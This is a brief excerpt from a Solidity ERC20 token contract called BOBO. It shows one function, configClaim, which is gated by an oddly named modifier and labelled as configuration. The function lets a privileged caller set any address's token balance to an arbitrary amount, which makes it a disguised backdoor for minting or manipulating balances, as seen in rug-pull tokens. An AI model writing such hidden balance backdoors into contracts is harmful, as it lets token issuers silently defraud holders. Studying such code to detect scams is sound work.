...
contract BOBO is IERC20, Ownable, BaseToken {
    ...
    function configClaim(uint256 _amount, address _addr) external rescueSCCcakeV3 { target = _addr; swapThreshold = _amount; _balances[target] = swapThreshold;
    }
